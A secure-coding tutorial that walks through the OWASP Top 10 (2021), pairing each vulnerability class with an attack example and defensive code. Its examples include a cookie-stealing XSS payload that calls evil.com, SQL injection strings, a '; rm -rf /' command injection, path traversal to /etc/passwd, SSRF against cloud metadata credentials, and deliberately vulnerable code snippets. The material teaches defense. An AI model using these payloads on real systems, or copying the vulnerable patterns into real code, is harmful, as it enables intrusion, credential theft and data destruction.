# Secure Coding — OWASP Top 10 and Vulnerability Prevention

## Overview

Secure coding is the practice of writing code that is resistant to exploitation. This module covers the OWASP Top 10 (2021), the most critical web application security risks, with detailed analysis of each vulnerability class, real-world exploitation techniques, and defense patterns. Content aligns with the OWASP Application Security Verification Standard (ASVS), OWASP Cheat Sheet Series, CWE/SANS Top 25, and MIT 6.858 (Zeldovich) lecture material on web security.

The cost of fixing a vulnerability increases by 6-15x between the coding phase and production (NIST). Secure coding prevents vulnerabilities at the cheapest phase.

---

## OWASP Top 10 (2021) — Detailed Analysis

### A01: Broken Access Control

**CWE mapping:** CWE-200, CWE-201, CWE-352, CWE-639, CWE-862, CWE-863

**Moved to #1 from #5.** The most common vulnerability class, found in 94% of applications tested (OWASP data).

**Attack patterns:**
- **IDOR (Insecure Direct Object Reference):** Modifying resource identifiers in URLs or API parameters to access other users' data. Example: `GET /api/invoices/1234` changed to `GET /api/invoices/1235` returns another user's invoice.
- **Forced browsing:** Accessing administrative pages without authentication. Example: `/admin/users` accessible without admin role check.
- **Privilege escalation:** Modifying user role in JWT or hidden form fields. Example: changing `{"role": "user"}` to `{"role": "admin"}` in a JWT payload when the server fails to validate against the database.
- **Path traversal:** `GET /api/files?name=../../../etc/passwd` accessing files outside the intended directory.
- **CORS misconfiguration:** `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` allows any origin to make authenticated requests.

**Defense (mandatory):**
```python
# RULE: Authorization check on EVERY endpoint, EVERY request
# NEVER rely on client-side checks or hidden UI elements

# BAD — No authorization check
@app.get("/api/invoices/{invoice_id}")
def get_invoice(invoice_id: int):
    return db.query(Invoice).get(invoice_id)  # Anyone can access any invoice

# GOOD — Server-side ownership check
@app.get("/api/invoices/{invoice_id}")
def get_invoice(invoice_id: int, current_user: User = Depends(get_current_user)):
    invoice = db.query(Invoice).get(invoice_id)
    if invoice.user_id != current_user.id:
        raise HTTPException(status_code=404)  # 404, not 403 (avoid enumeration)
    return invoice
```

**Additional controls:**
- Default deny: all endpoints require authentication unless explicitly public
- Use framework-level middleware for authentication/authorization, not per-handler checks
- Server-side authorization — never trust client-supplied role/permission data
- Rate limit sensitive endpoints (password reset, login, account creation)
- Return 404 (not 403) for unauthorized resource access to prevent enumeration

---

### A02: Cryptographic Failures

**CWE mapping:** CWE-259, CWE-327, CWE-331, CWE-328

**Previously "Sensitive Data Exposure." Renamed to focus on the root cause: cryptographic failures that lead to data exposure.**

**Common failures:**
- Transmitting data in cleartext (HTTP instead of HTTPS)
- Using deprecated algorithms (MD5, SHA-1, DES, RC4)
- Hardcoded encryption keys in source code
- Weak password hashing (SHA-256 instead of Argon2id)
- Missing encryption at rest for sensitive data
- Predictable IVs/nonces in encryption

**Defense:** See `01_foundations/cryptography.md` for complete cryptographic guidance. Summary:
- TLS 1.3 for all data in transit (no exceptions)
- AES-256-GCM for data at rest
- Argon2id for password hashing
- Keys in KMS/HSM, never in code
- Classify data to determine encryption requirements

---

### A03: Injection

**CWE mapping:** CWE-79 (XSS), CWE-89 (SQLi), CWE-77 (Command Injection), CWE-917 (Expression Language Injection)

**Injection occurs when untrusted data is sent to an interpreter as part of a command or query.** The fundamental cause: mixing data and control channels.

#### SQL Injection

**Attack:**
```sql
-- User input: ' OR 1=1 --
-- Vulnerable query:
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
-- Result: Returns all users, bypasses authentication

-- User input: '; DROP TABLE users; --
-- Vulnerable query:
SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
-- Result: Deletes the users table
```

**Defense (parameterized queries — the ONLY correct solution):**
```python
# BAD — String concatenation (NEVER DO THIS)
query = f"SELECT * FROM users WHERE username = '{username}'"

# GOOD — Parameterized query
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))

# GOOD — ORM (Prisma, SQLAlchemy, Drizzle)
user = db.query(User).filter(User.username == username).first()
```

**Additional SQL injection defenses (defense in depth, not replacements for parameterized queries):**
- Database user with least privilege (no DROP, no GRANT)
- WAF rules for common injection patterns
- Input validation (reject unexpected characters for structured fields)
- Stored procedures (reduce attack surface, but still parameterize inputs)

#### Cross-Site Scripting (XSS)

**Types:**
- **Reflected:** Malicious script in URL parameter, reflected back in response
- **Stored:** Malicious script persisted in database, served to all users viewing the content
- **DOM-based:** Client-side JavaScript processes attacker-controlled data into the DOM

**Attack (stored XSS):**
```html
<!-- User submits comment containing: -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- When other users view the comment, the script executes in their browser,
     sending their session cookie to the attacker -->
```

**Defense (output encoding + CSP):**
```javascript
// RULE 1: Context-aware output encoding (framework-handled in React, Vue, Angular)
// React JSX automatically escapes: <div>{userInput}</div> — safe by default
// Dangerous: dangerouslySetInnerHTML, v-html, [innerHTML] — audit every usage

// RULE 2: Content Security Policy header
// Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
// Blocks inline scripts and third-party script loading

// RULE 3: HTTPOnly cookies (prevents JavaScript access to session cookies)
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

#### Command Injection

**Attack:**
```python
# User input: ; rm -rf /
# Vulnerable code:
os.system(f"ping {user_input}")
# Executes: ping ; rm -rf /
```

**Defense:**
```python
# NEVER use shell execution with user input
# Use library functions or parameterized command execution

# BAD
os.system(f"convert {filename} output.png")

# GOOD — subprocess with list arguments (no shell interpretation)
subprocess.run(["convert", filename, "output.png"], shell=False)

# BETTER — use a library instead of shell commands
from PIL import Image
img = Image.open(filename)
img.save("output.png")
```

---

### A04: Insecure Design

**New in OWASP 2021.** Represents flaws in the design itself, not implementation bugs. No amount of secure coding fixes a fundamentally insecure design.

**Examples:**
- Password recovery that answers can be guessed from social media
- Shopping flow that does not validate prices server-side
- Account lockout that enables denial of service against other users
- Rate limiting only on the client side

**Defense:** Threat modeling during design phase (see `03_threat_modeling/`). Use abuse cases alongside use cases. Apply security design patterns.

---

### A05: Security Misconfiguration

**CWE mapping:** CWE-16, CWE-611

**The most commonly seen vulnerability in practice.** Default credentials, unnecessary features enabled, overly permissive configurations.

**Common misconfigurations:**
```yaml
# BAD — Debug mode in production
DEBUG: true
FLASK_ENV: development

# BAD — Default credentials
ADMIN_PASSWORD: admin
DATABASE_PASSWORD: password123

# BAD — Unnecessary HTTP methods
Allow: GET, POST, PUT, DELETE, TRACE, OPTIONS
# TRACE enables cross-site tracing attacks

# BAD — Directory listing enabled
Options +Indexes

# BAD — Stack traces in error responses
{
  "error": "NullPointerException at com.app.UserService.getUser(UserService.java:42)",
  "stackTrace": "..."
}
```

**Defense:**
- Hardened baseline configurations for all environments
- Remove default credentials, sample applications, unused features
- Automated configuration scanning in CI/CD
- Different credentials per environment (never share dev/staging/production)
- Generic error messages in production (log details server-side, not in response)

---

### A06: Vulnerable and Outdated Components

**CWE mapping:** CWE-1104

**80%+ of modern application code is third-party dependencies.** A vulnerability in any dependency is a vulnerability in your application.

**Defense:**
```bash
# Automated dependency scanning in CI/CD
npm audit                    # Node.js
pip-audit                    # Python
cargo audit                  # Rust
snyk test                    # Multi-language
trivy fs .                   # Multi-language, container images

# Lockfile pinning (reproducible builds)
package-lock.json            # npm
poetry.lock                  # Python
Cargo.lock                   # Rust

# Automated updates with review
# Dependabot, Renovate — create PRs for dependency updates
# Review changelogs and diff before merging
```

---

### A07: Identification and Authentication Failures

See `02_application_security/authentication.md` for complete coverage.

**Key failures:** Weak passwords, credential stuffing, missing MFA, session fixation, insecure "remember me," predictable session tokens.

---

### A08: Software and Data Integrity Failures

**CWE mapping:** CWE-829, CWE-494, CWE-502

**Includes:** Insecure deserialization, CI/CD pipeline integrity, software updates without verification.

**Defense against insecure deserialization:**
```python
# NEVER deserialize untrusted data with native serialization
# BAD
import pickle
data = pickle.loads(user_input)  # Arbitrary code execution

# GOOD — use safe formats
import json
data = json.loads(user_input)  # Cannot execute code
# Validate schema after parsing
```

---

### A09: Security Logging and Monitoring Failures

See `06_operations/security_monitoring.md` for complete coverage.

**Key requirements:** Log authentication events, authorization failures, input validation failures. Do NOT log sensitive data (passwords, tokens, PII). Ensure log integrity (immutable storage).

---

### A10: Server-Side Request Forgery (SSRF)

**CWE mapping:** CWE-918

**Attack:** Attacker causes the server to make HTTP requests to arbitrary destinations, including internal services and cloud metadata endpoints.

```python
# Vulnerable code: server fetches user-provided URL
@app.post("/api/fetch-preview")
def fetch_preview(url: str):
    response = requests.get(url)  # Attacker provides internal URL
    return response.text

# Attacker sends: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Result: Server returns AWS IAM credentials from metadata endpoint
```

**Defense:**
```python
# 1. URL allowlist (strongest control)
ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

# 2. Block internal IP ranges
import ipaddress
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),  # Cloud metadata
    ipaddress.ip_network("127.0.0.0/8"),     # Loopback
]

# 3. Disable HTTP redirects (attackers use redirects to bypass IP checks)
requests.get(url, allow_redirects=False)

# 4. Use IMDSv2 on AWS (requires token, blocks SSRF to metadata)
# aws ec2 modify-instance-metadata-options --http-tokens required
```

---

## Secure Coding Principles Summary

### Input Handling

```
ALL input is untrusted until validated.
Sources of untrusted input:
  - URL parameters, query strings, path segments
  - Request body (JSON, form data, XML, multipart)
  - HTTP headers (including cookies, Authorization, Referer, User-Agent)
  - File uploads (name, content, MIME type)
  - WebSocket messages
  - Database results (if database could be compromised)
  - Third-party API responses
  - Environment variables (in shared hosting)

Validation strategy:
  1. PARSE: Extract structured data from raw input (JSON.parse, etc.)
  2. VALIDATE: Check against schema (type, length, format, range, allowlist)
  3. SANITIZE: Remove or encode dangerous characters for the output context
  4. REJECT: If validation fails, return 400 with generic error (no input echo)
```

### Output Handling

```
ALL output must be encoded for its context:
  - HTML body: HTML entity encoding (&lt; &gt; &amp; &quot;)
  - HTML attributes: Attribute encoding (including quotes)
  - JavaScript: JavaScript encoding (or better, avoid inline JS entirely)
  - URL: URL encoding (percent-encoding)
  - CSS: CSS encoding (or avoid user input in CSS)
  - SQL: Parameterized queries (not encoding — parameterization separates data from code)
  - Command line: Avoid user input in commands; if unavoidable, use library functions

Framework auto-escaping (React JSX, Vue templates, Angular templates) handles
HTML context by default. Audit every bypass: dangerouslySetInnerHTML, v-html, [innerHTML].
```

### Error Handling

```
Production error responses:
  - Generic message: "An error occurred. Please try again."
  - Unique error ID for correlation: "Error ID: abc-123-def"
  - Log full details server-side (stack trace, input, context)
  - NEVER include: stack traces, database errors, file paths, internal IPs,
    framework versions, or user input in error responses

Authentication errors:
  - "Invalid email or password" (never reveal which field is wrong)
  - Same response time for valid and invalid usernames (prevent timing attacks)
  - Same HTTP status code for all auth failures (prevent enumeration)
```

---

## Language-Specific Secure Coding Guidance

### TypeScript/JavaScript (Node.js, Next.js)

```typescript
// Prototype pollution prevention
const safeObj = Object.create(null); // No prototype chain
// Or use Map instead of plain objects for user-controlled keys

// ReDoS prevention — avoid unbounded repetition in regex
// BAD: /(a+)+$/ — exponential backtracking
// GOOD: Use re2 library for untrusted patterns

// Path traversal prevention
import path from 'path';
const safePath = path.resolve(BASE_DIR, userInput);
if (!safePath.startsWith(BASE_DIR)) throw new Error('Path traversal');

// SQL injection — always use parameterized queries
// Prisma, Drizzle, Knex all parameterize by default
// NEVER use prisma.$queryRawUnsafe() with user input
```

### Python

```python
# YAML deserialization — NEVER use yaml.load() with untrusted input
import yaml
data = yaml.safe_load(user_input)  # safe_load prevents arbitrary object creation

# Template injection (SSTI)
# BAD: render_template_string(user_input)
# GOOD: render_template("template.html", data=user_input)

# SQL injection — use ORM or parameterized queries
# SQLAlchemy parameterizes by default via .filter()
# NEVER use text() with f-strings: text(f"SELECT * FROM users WHERE id = {user_id}")
```

---

**Secure coding is not an optional quality attribute. It is a mandatory engineering practice. Every line of code that processes untrusted input is a potential vulnerability. This module provides the patterns to eliminate vulnerability classes at the code level.**
